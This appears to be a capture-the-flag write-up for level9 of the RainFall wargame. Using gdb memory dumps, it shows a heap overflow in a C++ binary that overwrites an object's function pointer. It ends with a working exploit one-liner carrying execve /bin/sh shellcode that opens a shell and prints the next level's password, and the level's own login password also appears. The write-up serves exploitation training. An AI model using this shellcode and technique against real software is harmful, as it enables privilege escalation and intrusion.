login as the user `level9`


```shell
ssh -p 4242 level9@10.13.100.26
level9@10.13.100.26's password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
level9@RainFall:~$
```


a `SUID` exactable file is locates in the home directory

```shell
level9@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
level9@RainFall:~$ ./level9
```

<!-- 0x804a00c start of shell code adder  -->

using gdb we find a c++ program with a class method `setAnnotation` what call's `memcpy` copying the argv[1] into the class string pointer, then the program calls' a function pointer stored in the second instance of the class.

we can exploit this behavior by inserting our own shell code.

```gdb
(gdb) b *0x0804861c
Breakpoint 1 at 0x804861c
(gdb) b *0x0804862e
Breakpoint 2 at 0x804862e
(gdb) b* 0x0804863e
Breakpoint 3 at 0x804863e
(gdb) b *0x08048650
Breakpoint 4 at 0x8048650
(gdb) b* 0x0804867c
Breakpoint 5 at 0x804867c
(gdb) b *0x08048682
Breakpoint 6 at 0x8048682
(gdb) b *0x08048693
Breakpoint 7 at 0x8048693
(gdb) run AAAA
Starting program: /home/user/level9/level9 AAAA

Breakpoint 1, 0x0804861c in main ()
(gdb) c
Continuing.
Breakpoint 2, 0x0804862e in main ()
(gdb) x/64wx 0x804a000
0x804a000:      0x00000000      0x00000071      0x08048848      0x00000000
                      start of class allocation ^
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000005      0x00020f91      0x00000000      0x00000000
    N::N(this,5)^
...
(gdb) c
Continuing.
Breakpoint 3, 0x0804863e in main ()
(gdb) x/64wx 0x804a000
...
0x804a070:      0x00000005      0x00000071      0x00000000      0x00000000
                              second allocation ^
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e0:      0x00000000      0x00020f21      0x00000000      0x00000000
...
(gdb) c
Continuing.
Breakpoint 4, 0x08048650 in main ()
(gdb) x/64wx 0x804a000
...
0x804a070:      0x00000005      0x00000071      0x08048848      0x00000000
                 adder of second class instance ^
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e0:      0x00000006      0x00020f21      0x00000000      0x00000000
    N::N(this_00,6)^
...
(gdb) c
Continuing.
Breakpoint 5, 0x0804867c in main ()
(gdb) x/64wx 0x804a000
...
0x804a070:      0x00000005      0x00000071      0x08048848      0x00000000
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e0:      0x00000006      0x00020f21      0x00000000      0x00000000
...
(gdb) c
Continuing.
Breakpoint 6, 0x08048682 in main ()
(gdb) x $edx
0x804a00c:	0x41414141
(gdb) x/64wx 0x804a000
0x804a000:      0x00000000      0x00000071      0x08048848      0x41414141
                  memcpy (this + 4 , argv[1] , strlen(argv[1])) ^
...
(gdb) c
Continuing.
Breakpoint 7, 0x08048693 in main ()
(gdb) x $edx
0x804873a <_ZN1NplERS_>:        0x8be58955    #  operator + adder
(gdb) c
Continuing.
[Inferior 1 (process 2805) exited with code 013]
```


```shell
level9@RainFall:~$ ./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*76 + '\x0c\xa0\x04\x08'")
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$
```
